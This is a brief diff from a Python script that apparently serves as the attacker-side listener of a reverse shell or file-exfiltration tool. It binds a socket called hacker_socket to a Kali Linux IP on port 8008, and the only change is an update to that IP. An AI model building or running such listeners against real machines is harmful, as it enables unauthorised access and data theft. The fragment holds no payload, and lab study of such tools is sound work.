@@ -11,7 +11,7 @@ def receive_file():
 if __name__ == "__main__":
     hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     hacker_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    hacker_IP = "192.168.64.111" # kali linux IP
+    hacker_IP = "192.168.0.154" # kali linux IP
     hacker_port = 8008
     socket_address = (hacker_IP, hacker_port)
     hacker_socket.bind(socket_address)
